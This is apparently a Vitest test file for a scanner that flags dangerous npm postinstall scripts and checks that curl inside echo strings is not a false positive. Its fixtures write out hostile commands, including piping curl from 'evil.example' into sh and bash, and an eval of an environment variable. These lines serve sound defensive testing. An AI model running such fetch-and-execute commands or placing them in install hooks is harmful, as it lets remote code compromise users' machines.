import { describe, expect, it } from "vitest";
import { analyzeLifecycleScripts, hasLifecycleScripts } from "../src/dangerous-scripts.js";

describe("analyzeLifecycleScripts", () => {
  it("detects shell pipe pattern", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "curl https://evil.example/x | sh",
    });
    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(true);
  });

  it("detects eval", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "node -e \"eval(process.env.X)\"",
    });
    expect(f.some((x) => x.id === "script-eval")).toBe(true);
  });

  it("skips benign node-gyp without curl", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "node-gyp rebuild",
    });
    expect(f.length).toBe(0);
  });

  it("hasLifecycleScripts", () => {
    expect(hasLifecycleScripts({ postinstall: "echo hi" })).toBe(true);
    expect(hasLifecycleScripts({ build: "tsc" })).toBe(false);
  });

  // shell-quote false-positive reduction
  it("does NOT flag curl appearing only inside an echo string argument", () => {
    // The pipe is inside a string literal passed to echo, not an actual shell pipe
    const f = analyzeLifecycleScripts({
      postinstall: "echo 'install manually: curl https://example.com | sh'",
    });
    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(false);
  });

  it("does NOT flag curl appearing inside an echo as a remote-download command", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "echo 'run: curl https://example.com/setup.sh'",
    });
    expect(f.some((x) => x.id === "script-remote-download")).toBe(false);
  });

  it("detects remote-download when curl is the actual command", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "curl https://example.com/setup.sh -o /tmp/setup.sh",
    });
    expect(f.some((x) => x.id === "script-remote-download")).toBe(true);
  });

  it("detects pipe-to-bash", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "curl https://evil.example/x | bash",
    });
    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(true);
  });
});
